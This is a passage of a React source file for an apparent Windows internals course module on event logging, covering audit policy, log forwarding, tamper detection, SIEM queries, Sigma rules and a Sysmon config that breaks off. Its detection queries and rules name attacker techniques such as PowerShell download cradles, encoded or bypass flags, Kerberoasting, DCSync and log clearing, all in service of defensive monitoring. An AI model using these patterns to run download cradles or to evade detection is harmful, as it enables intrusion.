            <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>⚠ {t}</div>
            <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
          </div>
        ))}
      </div>
      <div>
        <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ LOG INTEGRITY PROTECTION</div>
        {[
          ["WEF forwarding = primary protection", "Events forwarded to WEC/SIEM before attacker can clear local logs. Even if local logs cleared, SIEM retains forwarded copy. Deploy WEF on all critical systems.", C.green],
          ["Alert on 1102/104 immediately", "Any Security log clear (1102) or System log clear (104) = CRITICAL SIEM alert. Should NEVER happen in production without approved change.", C.cyan],
          ["Protected Event Logging (PEL)", "Encrypt event log content with SIEM public key at source. Attacker cannot read or modify encrypted log entries without private key.", C.teal],
          ["EventRecordID monitoring", "SIEM tracks last EventRecordID seen per host. Gap in sequence = records deleted. Alert on non-sequential EventRecordIDs from same host.", C.orange],
          ["EVTX checksum validation", "Offline: parse EVTX with python-evtx library, verify chunk CRC32 checksums. Any mismatch = tampered event records in that chunk.", C.purple],
        ].map(([t, d, c]) => (
          <div key={t} style={{ background: "#08120a", border: `1px solid ${c}33`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
            <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>✓ {t}</div>
            <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
          </div>
        ))}
      </div>
    </div>
  </div>
);

/* ── SIEM Query Panel ────────────────────────────────────────────────────── */
const SIEMQueries = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.sky, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SPLUNK SPL DETECTION QUERIES</div>
        <div style={S.code}>
{`-- Brute force detection:`}
{`index=wineventlog EventCode=4625`}
{`| stats count by src_ip, Account_Name`}
{`| where count > 10`}
{`| sort -count`}
{``}
{`-- Kerberoasting (RC4 TGS requests):`}
{`index=wineventlog EventCode=4769`}
{`  Ticket_Encryption_Type=0x17`}
{`  Service_Name!=krbtgt`}
{`| stats count by Account_Name, Service_Name`}
{`| where count > 3`}
{``}
{`-- DCSync from non-DC:`}
{`index=wineventlog EventCode=4662`}
{`  Properties="*1131f6a*"  OR Properties="*1131f6ad*"`}
{`| lookup domain_controllers dc_name AS SubjectUserName`}
{`| where isnull(dc_name)`}
{`| table _time SubjectUserName SubjectDomainName`}
{``}
{`-- Lateral movement via SMB (Event 5140):`}
{`index=wineventlog EventCode=5140`}
{`  Share_Name="\\\\*\\ADMIN$"`}
{`| stats count by src_ip, Account_Name, dest`}
{`| where src_ip not in (known_admin_ips)`}
        </div>
      </div>
      <div>
        <div style={{ color: C.lime, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ ELASTIC / KQL DETECTION QUERIES</div>
        <div style={S.code}>
{`// Script block logging — download cradles:`}
{`event.code: "4104"`}
{`AND winlog.event_data.ScriptBlockText: (`}
{`    "DownloadString" OR`}
{`    "Invoke-Expression" OR`}
{`    "WebClient"`}
{`)`}
{``}
{`// Suspicious PS process creation:`}
{`event.code: "4688"`}
{`AND process.name: "powershell.exe"`}
{`AND (process.args: "-EncodedCommand" OR`}
{`     process.args: "-exec bypass" OR`}
{`     process.args: "-windowstyle hidden")`}
{``}
{`// New service outside system paths:`}
{`event.code: "7045"`}
{`AND NOT winlog.event_data.ImagePath`}
{`    : ("*System32*" OR "*Program Files*")`}
{``}
{`// WMI subscription creation:`}
{`event.code: ("19" OR "20" OR "21")`}
{`AND source: "Microsoft-Windows-Sysmon"`}
{``}
{`// Log clear events:`}
{`event.code: ("1102" OR "104")`}
        </div>
      </div>
    </div>
    <div style={{ marginTop: "12px" }}>
      <div style={{ color: C.teal, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SIGMA RULES — VENDOR-NEUTRAL DETECTION</div>
      <div style={S.code}>
{`title: Kerberoasting via PowerShell`}
{`status: stable`}
{`logsource:`}
{`    product: windows`}
{`    service: security`}
{`detection:`}
{`    selection:`}
{`        EventID: 4769`}
{`        TicketEncryptionType: '0x17'`}
{`    filter:`}
{`        ServiceName|endswith: '$'`}
{`    condition: selection and not filter`}
{`falsepositives: Rare legacy applications using RC4`}
{`level: high`}
{`tags:`}
{`    - attack.credential_access`}
{`    - attack.t1558.003`}
{``}
{`# Convert Sigma to platform-specific query:`}
{`sigma convert -t splunk -f splunk_windows rules/kerberoasting.yml`}
{`sigma convert -t es-qs rules/kerberoasting.yml  # Elasticsearch`}
{`sigma convert -t sentinel-aql rules/*.yml       # Microsoft Sentinel`}
      </div>
    </div>
  </div>
);

/* ── Audit Policy Config ─────────────────────────────────────────────────── */
const AuditPolicyConfig = () => (
  <div>
    <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "10px", fontSize: "11px" }}>▸ ADVANCED AUDIT POLICY — COMPLETE ENTERPRISE CONFIGURATION</div>
    <div style={S.grid2}>
      {[
        { cat: "Account Logon", color: C.cyan, policies: [
          ["Kerberos Authentication Service", "S+F", "4768/4771 — AS-REQ success/fail"],
          ["Kerberos Service Ticket Operations", "S+F", "4769 — TGS-REQ requests"],
          ["Other Account Logon Events", "S+F", "4648 — explicit credential use"],
          ["Credential Validation", "S+F", "4776 — NTLM validation on DC"],
        ]},
        { cat: "Account Management", color: C.orange, policies: [
          ["Security Group Management", "S+F", "4728/4732/4756 — group membership"],
          ["User Account Management", "S+F", "4720/4722/4725 — account changes"],
          ["Computer Account Management", "S", "4741/4742 — computer object changes"],
          ["Distribution Group Management", "S", "4749/4753 — dist group changes"],
        ]},
        { cat: "Detailed Tracking", color: C.green, policies: [
          ["Process Creation", "S", "4688 — process create + cmdline"],
          ["Process Termination", "S", "4689 — process end"],
          ["DPAPI Activity", "S+F", "4692 — DPAPI backup key ops"],
          ["RPC Events", "S", "5712 — RPC call audit"],
        ]},
        { cat: "DS Access", color: C.purple, policies: [
          ["Directory Service Access", "S+F", "4661 — AD object access"],
          ["Directory Service Changes", "S", "5136/5137/5138/5141 — AD changes"],
          ["Directory Service Replication", "S+F", "4662 — DCSync detection!"],
        ]},
        { cat: "Logon/Logoff", color: C.teal, policies: [
          ["Logon", "S+F", "4624/4625 — logon events"],
          ["Logoff", "S", "4634 — logoff"],
          ["Special Logon", "S", "4672 — privileged logon"],
          ["Account Lockout", "F", "4740 — lockout events"],
        ]},
        { cat: "Object Access", color: C.yellow, policies: [
          ["File System", "S+F", "4663 — file access (needs SACL)"],
          ["Registry", "S+F", "4663 — reg key access (needs SACL)"],
          ["SAM", "S+F", "4661 — SAM DB access"],
          ["Certification Services", "S+F", "4870/4876 — PKI events"],
          ["Filtering Platform Connection", "S+F", "5156/5157 — WFP events"],
          ["Handle Manipulation", "S", "4658 — handle close"],
          ["Network Share Access", "S+F", "5140/5145 — share access"],
          ["Other Object Access", "S+F", "4698 — scheduled task"],
        ]},
        { cat: "Policy Change", color: C.red, policies: [
          ["Audit Policy Change", "S+F", "4719 — audit policy changed"],
          ["Authentication Policy", "S+F", "4713/4739 — Kerberos/domain policy"],
          ["MPSSVC Rule Change", "S", "4946 — firewall rule added/changed"],
          ["Other Policy Change", "S+F", "4902 — per-user audit policy"],
        ]},
        { cat: "Privilege Use", color: C.pink, policies: [
          ["Sensitive Privilege Use", "S+F", "4673 — SeDebug, SeBackup, etc."],
          ["Non-Sensitive Privilege Use", "off", "Too noisy for most orgs"],
        ]},
        { cat: "System", color: C.gold, policies: [
          ["Security System Extension", "S+F", "4614 — auth package loaded"],
          ["System Integrity", "S+F", "4612 — audit subsystem issues"],
          ["IPsec Driver", "S+F", "4960 — IPsec packet drop"],
          ["Other System Events", "S+F", "4616 — system time changed"],
        ]},
      ].map(({ cat, color, policies }) => (
        <div key={cat} style={{ background: "#07080c", border: `1px solid ${color}22`, borderRadius: "4px", overflow: "hidden" }}>
          <div style={{ background: C.header, padding: "6px 10px", borderBottom: `1px solid ${color}33` }}>
            <span style={{ color, fontWeight: "700", fontSize: "11px" }}>▸ {cat}</span>
          </div>
          <div style={{ padding: "8px" }}>
            {policies.map(([name, setting, note]) => (
              <div key={name} style={{ display: "flex", gap: "6px", marginBottom: "5px", alignItems: "flex-start" }}>
                <span style={{ ...S.badge(setting === "off" ? C.dim : color), minWidth: "32px", textAlign: "center", flexShrink: 0, fontSize: "9px" }}>{setting}</span>
                <div>
                  <div style={{ color: C.text, fontSize: "10.5px" }}>{name}</div>
                  <div style={{ color: C.dim, fontSize: "9.5px" }}>{note}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      ))}
    </div>
    <div style={{ marginTop: "10px" }}>
      <div style={S.code}>
{`# Apply complete advanced audit policy via GPO:`}
{`# Computer Config → Windows Settings → Security Settings`}
{`# → Advanced Audit Policy Configuration`}
{``}
{`# Or via auditpol.exe:`}
{`auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable`}
{`auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable`}
{`auditpol /set /subcategory:"Process Creation" /success:enable`}
{`auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable`}
{``}
{`# Export current policy:`}
{`auditpol /backup /file:C:\\audit_policy_backup.csv`}
{``}
{`# IMPORTANT: Enable process cmdline auditing (separate setting):`}
{`# GPO: Admin Templates → System → Audit Process Creation`}
{`# → Include command line in process creation events = Enabled`}
      </div>
    </div>
  </div>
);

/* ── Log Collection Workflow ─────────────────────────────────────────────── */
const LogWorkflow = () => {
  const steps = [
    { id:"01", label:"Event generated by source (kernel/app/service)", sub:"ETW provider writes to session ring buffer", color:C.cyan, detail:"Kernel events (process create, network, file) written to ETW kernel session ring buffer. Security events routed to EventLog-Security ETW session. Application events to their registered channels." },
    { id:"02", label:"Event Log service receives from ETW", sub:"wevtsvc subscribes to ETW sessions", color:C.teal, detail:"Windows Event Log service (wevtsvc) subscribes as ETW consumer. Events dequeued from ring buffer. Event XML rendered with string table substitution. Routing rules (channel manifest) determine destination .evtx file." },
    { id:"03", label:"Event written to .evtx channel file", sub:"Binary BinXML encoded in EVTX chunk", color:C.gold, detail:"Event serialized to BinXML format (compact XML binary). Written to current chunk in .evtx file. EventRecordID assigned (monotonic). Chunk checksum updated. Max size enforced — oldest events purged if log full." },
    { id:"04", label:"WEF subscription forwards event", sub:"WinRM pushes event to WEC collector", color:C.orange, detail:"If WEF configured: matching events pushed/pulled via WinRM (WS-Man protocol) to WEC server. Bookmark tracks last forwarded EventRecordID. TLS encrypted if HTTPS listener. Events written to ForwardedEvents channel on WEC." },
    { id:"05", label:"SIEM agent collects from channel", sub:"Splunk UF / Elastic Agent / NXLog", color:C.purple, detail:"SIEM agent monitors configured channels via Windows Event Log API (EvtSubscribe). Reads new events since last checkpoint. Serializes to SIEM format (JSON for Elastic, key-value for Splunk). Sends over encrypted channel to SIEM indexer." },
    { id:"06", label:"SIEM indexes and enriches event", sub:"Parsing → field extraction → enrichment → alert", color:C.green, detail:"SIEM parses XML event data. Field extraction (EventID, SubjectUserName, TargetObject, etc.). Enrichment: GeoIP lookup, threat intel IOC match, asset DB lookup. Correlation rules evaluated. Alerts fired if rule matches." },
    { id:"07", label:"Detection rule fires → SOC alert", sub:"SIEM alert → ticketing → analyst triage", color:C.red, detail:"Alert pushed to ticketing system (ServiceNow, Jira) or SOAR platform. Analyst receives alert with full event context. SOAR playbook may auto-enrich (VirusTotal hash check, AD user lookup) or auto-respond (isolate host, disable account)." },
    { id:"08", label:"Forensic investigation from SIEM/EVTX", sub:"Timeline reconstruction → incident scope", color:C.lime, detail:"DFIR analyst queries SIEM for full timeline. Correlated events across multiple hosts. EVTX files collected from impacted hosts for offline analysis. Timeline tools (Plaso, log2timeline) generate unified timeline. Report generated." },
  ];
  return (
    <div>
      {steps.map((s, i) => (
        <div key={s.id} style={{ display: "flex", gap: "0" }}>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", width: "30px" }}>
            <div style={{ width: "22px", height: "22px", borderRadius: "50%", background: `${s.color}18`, border: `1.5px solid ${s.color}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "9px", color: s.color, fontWeight: "700", flexShrink: 0 }}>{s.id}</div>
            {i < steps.length - 1 && <div style={{ width: "1px", height: "28px", background: `${s.color}33` }} />}
          </div>
          <div style={{ paddingLeft: "10px", paddingBottom: "8px", flex: 1 }}>
            <div style={{ display: "flex", gap: "8px", alignItems: "center", flexWrap: "wrap" }}>
              <span style={{ color: s.color, fontWeight: "700", fontSize: "12px" }}>{s.label}</span>
              <span style={S.badge(s.color)}>{s.sub}</span>
            </div>
            <div style={{ color: C.dim, fontSize: "11px", marginTop: "2px", fontStyle: "italic" }}>{s.detail}</div>
          </div>
        </div>
      ))}
    </div>
  );
};

export default function WindowsStep11() {
  const [archTab, setArchTab] = useState("evtlog");
  const [intTab,  setIntTab]  = useState("sysmon");
  const [monTab,  setMonTab]  = useState("eventids");
  const [defTab,  setDefTab]  = useState("audit");
  const [forensicsTab, setForensicsTab] = useState("tampering");
  const [cmpTab,  setCmpTab]  = useState("logging");

  return (
    <div style={S.root}>
      <div style={S.bar}>
        <div style={{ display: "flex", gap: "6px" }}>
          {[C.red, C.yellow, C.green].map((c, i) => <span key={i} style={S.dot(c)} />)}
        </div>
        <span style={{ color: C.teal, fontSize: "11px", fontWeight: "700", letterSpacing: "2px" }}>WIN-INTERNALS//CONSOLE</span>
        <span style={{ color: C.dim, fontSize: "10px", marginLeft: "auto" }}>MODULE 11 · EVENT LOGGING ENGINE · NT 10.0</span>
        <span style={S.dot(C.green)} />
      </div>

      <div style={S.wrap}>

        {/* ── 1: Title ── */}
        <div style={{ ...S.panel(C.teal), background: "linear-gradient(135deg, #080910 55%, #001818)" }}>
          <div style={S.pb}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: "12px" }}>
              <div>
                <div style={{ color: C.dim, fontSize: "10px", letterSpacing: "3px", marginBottom: "5px" }}>WINDOWS INTERNALS CURRICULUM · STEP 11</div>
                <div style={{ color: C.teal, fontSize: "22px", fontWeight: "800", lineHeight: "1.2" }}>Windows Event Logging</div>
                <div style={{ color: C.bright, fontSize: "14px", fontWeight: "600", marginTop: "2px" }}>EVTX · ETW · Sysmon · WEF · Audit Policy · SIEM Integration · Forensic Analysis</div>
                <div style={{ color: C.dim, fontSize: "11.5px", marginTop: "5px" }}>The forensic record of everything Windows does — the foundation of all detection and incident response</div>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "5px", alignItems: "flex-end" }}>
                <Pill c={C.green}>LEVEL: BEGINNER → ADVANCED</Pill>
                <Pill c={C.teal}>DOMAIN: MONITORING / FORENSICS / DETECTION</Pill>
                <Pill c={C.purple}>MODULE 11 / 20+</Pill>
              </div>
            </div>
            <hr style={S.sep} />
            <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
              {["SOC Analyst","DFIR","Blue Team","Security Engineer","Threat Hunter","Auditor","Compliance","SIEM Engineer","SysAdmin"].map(r => (
                <Tag key={r} c={C.teal}>{r}</Tag>
              ))}
            </div>
          </div>
        </div>

        {/* ── 2: Concept ── */}
        <PB title="CONCEPT EXPLANATION" icon="🧠" color={C.cyan}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ BEGINNER VIEW</div>
              <Row c={C.green}>Windows maintains detailed records of everything that happens on the system — user logons, processes started, files accessed, network connections, configuration changes. These <strong style={{color:C.bright}}>event logs</strong> are the forensic foundation for understanding what happened during a security incident.</Row>
              <Row c={C.green}>Logs are stored in <strong style={{color:C.bright}}>EVTX files</strong> (binary XML format) in C:\Windows\System32\winevt\Logs\. Key logs: Security (auth/access), System (services/drivers), Application (app-specific), and hundreds of operational logs for individual components.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>Sysmon</strong> (System Monitor) is a free Sysinternals tool that extends Windows logging significantly — capturing process creations with full command lines and hashes, network connections, file creates, registry changes, and much more. It's the #1 recommended addition to any Windows security logging stack.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>Windows Event Forwarding (WEF)</strong> collects events from hundreds of computers to a central collector server. Without centralised forwarding, an attacker can clear local logs to destroy evidence. WEF ensures events reach your SIEM before that's possible.</Row>
            </div>
            <div>
              <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ TECHNICAL INTERNALS</div>
              <Row c={C.purple}><strong style={{color:C.bright}}>ETW (Event Tracing for Windows)</strong> is the underlying telemetry infrastructure. Every event source registers as an <strong style={{color:C.bright}}>ETW provider</strong> with a GUID. The kernel ETW engine manages sessions (ring buffers), keyword filtering, and delivery to consumers. The Event Log service is just one ETW consumer.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>EVTX binary format</strong>: each file has a header, divided into 64KB chunks. Each chunk contains event records with BinXML encoding (compact binary XML with string tables). Chunks have CRC32 checksums — tampering is detectable by checksum validation.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>Advanced Audit Policy</strong> (via auditpol or GPO) controls which events are generated for each subcategory. Basic policy is too coarse. Advanced policy provides fine-grained control: e.g. audit only successful logins, not failed (or both). Must be enabled separately from the old "Basic Audit Policy" settings.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>Microsoft-Windows-Threat-Intelligence ETW provider</strong> gives kernel-level telemetry unavailable through normal event logs — including process injection detection, memory allocation patterns, and syscall-level behaviour. Used by EDR products and available to security researchers via ETW subscription.</Row>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid4}>
            {[
              ["Forward before they clear", "Local log clearing destroys evidence. WEF pushes events to central collector before attacker can clear. SIEM has copy regardless of local state.", C.red],
              ["Audit policy = what gets logged", "By default, many critical events NOT logged. Process creation (4688) requires explicit audit policy. Cmdline capture requires additional GPO. Enable Advanced Audit Policy.", C.orange],
              ["Sysmon fills critical gaps", "4688 misses: hashes, PPID, network connections, DLL loads, registry writes. Sysmon adds all of these. Deploy with SwiftOnSecurity config as baseline.", C.cyan],
              ["EventRecordID = tamper detector", "Each event gets sequential RecordID. SIEM tracking gaps = deleted events. Chain of custody: if SIEM shows 4624 at RecordID 1000 then next is 2000 = 1000 events deleted.", C.yellow],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#07080c", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 3: Architecture ── */}
        <PB title="LOGGING ARCHITECTURE — EVTX · ETW · WEF · BINARY FORMAT" icon="🏗" color={C.purple} accent={C.purple + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["evtlog","EVENT LOG ARCH"],["etw","ETW ARCHITECTURE"],["wef","WEF COLLECTION"],["evtx","EVTX FORMAT"]].map(([t, l]) => (
              <button key={t} style={S.tab(archTab === t, C.purple)} onClick={() => setArchTab(t)}>{l}</button>
            ))}
          </div>
          {archTab === "evtlog" && <EventLogArch />}
          {archTab === "etw"    && <ETWArch />}
          {archTab === "wef"    && <WEFArch />}
          {archTab === "evtx"   && <EVTXFormat />}
        </PB>

        {/* ── 4: Workflow ── */}
        <PB title="WORKFLOW — EVENT GENERATION TO SIEM ALERT" icon="🔄" color={C.orange}>
          <LogWorkflow />
          <hr style={S.sep} />
          <div style={{ color: C.dim, fontSize: "11px" }}>
            <strong style={{ color: C.orange }}>Key insight:</strong> The EventRecordID assigned at Step 3 is the forensic anchor. Your SIEM (Step 6) should track the last seen RecordID per host per channel. If the next collected event has a RecordID jump (1000 → 2000), your SIEM knows 1000 events were deleted between collection intervals — even if you never saw those events.
          </div>
        </PB>

        {/* ── 5: Commands ── */}
        <PB title="CMD / POWERSHELL / WEVTUTIL — LOG OPERATIONS & QUERIES" icon="⌨" color={C.green}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ EVENT LOG QUERYING</div>
              <div style={S.code}>
{`# List all available log channels:`}
{`PS> Get-WinEvent -ListLog * | Where RecordCount -gt 0 |`}
{`    Select LogName, RecordCount, MaximumSizeInBytes |`}
{`    Sort RecordCount -Desc | Select -First 20`}
{``}
{`# Query specific events (last 24h):`}
{`PS> $start = (Get-Date).AddHours(-24)`}
{`PS> Get-WinEvent -FilterHashtable @{`}
{`        LogName='Security'; Id=4624`}
{`        StartTime=$start`}
{`    } | Select TimeCreated,`}
{`        @{N="User";E={$_.Properties[5].Value}},`}
{`        @{N="Type";E={$_.Properties[8].Value}},`}
{`        @{N="Source";E={$_.Properties[18].Value}}`}
{``}
{`# wevtutil - raw query:`}
{`wevtutil qe Security /q:"*[System[EventID=4688]]"`}
{`    /rd:true /f:text /c:100`}
{``}
{`# Export specific events to CSV:`}
{`Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} |`}
{`    Select TimeCreated,`}
{`    @{N="Process";E={$_.Properties[5].Value}},`}
{`    @{N="CmdLine";E={$_.Properties[8].Value}} |`}
{`    Export-Csv -Path C:\\ir\\processes.csv -NoTypeInformation`}
              </div>
            </div>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ LOG MANAGEMENT & HEALTH</div>
              <div style={S.code}>
{`# Check log sizes and config:`}
{`wevtutil gl Security`}
{`# Shows: maxSize, retentionDays, fileMode`}
{``}
{`# Increase Security log size (100MB):`}
{`wevtutil sl Security /ms:104857600`}
{``}
{`# Check Sysmon status:`}
{`Get-Service Sysmon64`}
{`wevtutil gl Microsoft-Windows-Sysmon/Operational`}
{``}
{`# Install/update Sysmon:`}
{`sysmon64.exe -accepteula -i sysmonconfig.xml`}
{`sysmon64.exe -c sysmonconfig.xml  # update config`}
{``}
{`# WEF - configure subscription source:`}
{`wecutil cs MySubscription.xml`}
{`wecutil gs MySubscription  # show subscription status`}
{`wecutil gr MySubscription  # retry all sources`}
{``}
{`# Verify audit policy is applied:`}
{`auditpol /get /category:*`}
{`# Check: each subcategory shows Success/Failure`}
{``}
{`# ETW session management:`}
{`logman query providers  # list all ETW providers`}
{`logman start MySess -p Microsoft-Windows-Sysmon`}
{`    0xff 0x4 -ets  # start realtime session`}
              </div>
            </div>
          </div>
          <div style={{ marginTop: "12px" }}>
            <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ FORENSIC EVENT ANALYSIS (DFIR COMMANDS)</div>
            <div style={S.code}>
{`# Get EventRecordID range for Security log (gap detection):`}
{`$firstRec = (Get-WinEvent -LogName Security -MaxEvents 1`}
{`    -Oldest).RecordId`}
{`$lastRec  = (Get-WinEvent -LogName Security -MaxEvents 1`}
{`    ).RecordId`}
{`"First: $firstRec  Last: $lastRec  Total: $($lastRec-$firstRec)"`}
{``}
{`# Parse EVTX offline (python-evtx for forensics):`}
{`# pip install python-evtx`}
{`python3 -c "`}
{`import Evtx.Evtx as evtx`}
{`with evtx.Evtx('Security.evtx') as log:`}
{`    for record in log.records():`}
{`        print(record.record_num, record.data()[:100])"`}
{``}
{`# Timeline generation with Plaso (log2timeline):`}
{`log2timeline.py /cases/timeline.plaso /evidence/`}
{`psort.py -o csv -w /cases/timeline.csv /cases/timeline.plaso`}
{``}
{`# Hayabusa — fast EVTX threat hunting:`}
{`hayabusa.exe csv-timeline -d C:\\evtx_collection -o timeline.csv`}
{`hayabusa.exe logon-summary -d C:\\evtx_collection`}
{`hayabusa.exe metrics -d C:\\evtx_collection  # event volume analysis`}
            </div>
          </div>
        </PB>

        {/* ── 6: Internal View ── */}
        <PB title="INTERNAL SYSTEM VIEW — SYSMON EVENTS · EVENT ID REFERENCE" icon="🔬" color={C.teal}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["sysmon","SYSMON EVENT REFERENCE"],["eventids","WINDOWS EVENT ID REFERENCE"]].map(([t, l]) => (
              <button key={t} style={S.tab(intTab === t, C.teal)} onClick={() => setIntTab(t)}>{l}</button>
            ))}
          </div>
          {intTab === "sysmon"   && <SysmonRef />}
          {intTab === "eventids" && <EventIDRef />}
        </PB>

        {/* ── 7: Audit Policy ── */}
        <PB title="AUDIT POLICY — COMPLETE ENTERPRISE CONFIGURATION" icon="📋" color={C.yellow} accent={C.yellow + "33"}>
          <AuditPolicyConfig />
        </PB>

        {/* ── 8: Forensics ── */}
        <PB title="FORENSIC ANALYSIS — LOG TAMPERING · SIEM QUERIES · SIGMA" icon="🔍" color={C.gold} accent={C.gold + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["tampering","siem_queries","sigma"].map(t => (
              <button key={t} style={S.tab(forensicsTab === t, C.gold)} onClick={() => setForensicsTab(t)}>{t.replace("_"," ").toUpperCase()}</button>
            ))}
          </div>
          {forensicsTab === "tampering"   && <TamperDetection />}
          {forensicsTab === "siem_queries"&& <SIEMQueries />}
          {forensicsTab === "sigma"       && (
            <div>
              <div style={{ color: C.gold, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SIGMA RULE FRAMEWORK — VENDOR-NEUTRAL DETECTION RULES</div>
              <div style={S.grid2}>
                <div>
                  <div style={S.code}>
{`# Sigma rule structure:`}
{`title: Suspicious PowerShell Download Cradle`}
{`id: 3b6ab547-8ec2-4991-9f69-bf5e88e8a3f`}
{`status: test`}
{`description: Detects download cradle patterns`}
{`references:`}
{`    - https://attack.mitre.org/techniques/T1059/001/`}
{`author: SecurityTeam`}
{`date: 2024/11/14`}
{`logsource:`}
{`    product: windows`}
{`    service: powershell`}
{`    definition: Script Block Logging must be enabled`}
{`detection:`}
{`    keywords:`}
{`        - 'DownloadString'`}
{`        - 'WebClient'`}
{`        - 'Invoke-Expression'`}
{`    condition: keywords`}
{`falsepositives:`}
{`    - Legitimate update scripts`}
{`    - Software deployment tools`}
{`level: high`}
{`tags:`}
{`    - attack.execution`}
{`    - attack.t1059.001`}
{`    - attack.defense_evasion`}
{`    - attack.t1140`}
                  </div>
                </div>
                <div>
                  <div style={{ color: C.teal, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SIGMA CONVERSION & DEPLOYMENT</div>
                  <div style={S.code}>
{`# Install sigma-cli:`}
{`pip install sigma-cli`}
{``}
{`# Convert to Splunk:`}
{`sigma convert -t splunk -f splunk_windows`}
{`    rules/windows/powershell/`}
{``}
{`# Convert to Elasticsearch Query String:`}
{`sigma convert -t es-qs -f ecs_windows`}
{`    rules/windows/security/`}
{``}
{`# Convert to Microsoft Sentinel KQL:`}
{`sigma convert -t sentinel-aql`}
{`    rules/windows/network/`}
{``}
{`# Convert to Elastic SIEM rules (bulk):`}
{`sigma convert -t lucene -f ecs_windows`}
{`    --output-format stix2`}
{`    rules/windows/ > rules.json`}
{``}
{`# Community Sigma rule repositories:`}
{`# SigmaHQ: github.com/SigmaHQ/sigma`}
{`# 3000+ rules covering MITRE ATT&CK`}
{`# Regular updates from security community`}
{``}
{`# Key rule directories:`}
{`# rules/windows/builtin/security/ → Security.evtx`}
{`# rules/windows/powershell/       → PS logging`}
{`# rules/windows/sysmon/           → Sysmon events`}
{`# rules/network/                  → network events`}
                  </div>
                  <div style={{ marginTop: "10px" }}>
                    {[
                      ["3000+ rules", "SigmaHQ community repository covers all major Windows attack techniques", C.cyan],
                      ["MITRE ATT&CK mapped", "Every rule tagged with ATT&CK technique IDs for framework alignment", C.purple],
                      ["Platform agnostic", "One rule converts to Splunk, Elastic, Sentinel, QRadar, ArcSight", C.green],
                    ].map(([t, d, c]) => (
                      <div key={t} style={{ background: "#07080c", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "6px" }}>
                        <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
                        <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          )}
        </PB>

        {/* ── 9: Monitoring Panel ── */}
        <PB title="MONITORING TOOLS & SYSMON CONFIGURATION" icon="👁" color={C.yellow}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["sysmon_config","tools","iocs"].map(t => (
              <button key={t} style={S.tab(monTab === t, C.yellow)} onClick={() => setMonTab(t)}>{t.replace("_"," ").toUpperCase()}</button>
            ))}
          </div>

          {monTab === "eventids" && null}

          {monTab === "sysmon_config" && (
            <div style={S.grid2}>
              <div>
                <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SYSMON DEPLOYMENT — BEST PRACTICE CONFIG</div>
                <div style={S.code}>
{`<!-- Minimal high-value Sysmon config: -->`}
{`<Sysmon schemaversion="4.90">`}
{`  <HashAlgorithms>sha256,imphash</HashAlgorithms>`}
{`  <CheckRevocation>True</CheckRevocation>`}
{`  <DnsLookup>True</DnsLookup>`}
{``}
{`  <EventFiltering>`}
{``}
{`    <!-- Event 1: All process creates (with hash) -->`}
{`    <ProcessCreate onmatch="exclude">`}
{`      <!-- Exclude very noisy but safe processes -->`}
{`      <Image condition="is">C:\\Windows\\System32\\conhost.exe</Image>`}
{`    </ProcessCreate>`}
{``}
{`    <!-- Event 3: Network only from interesting procs -->`}
{`    <NetworkConnect onmatch="include">`}
{`      <Image condition="end with">powershell.exe</Image>`}
{`      <Image condition="end with">cmd.exe</Image>`}
{`      <Image condition="end with">wscript.exe</Image>`}
{`      <Image condition="end with">mshta.exe</Image>`}
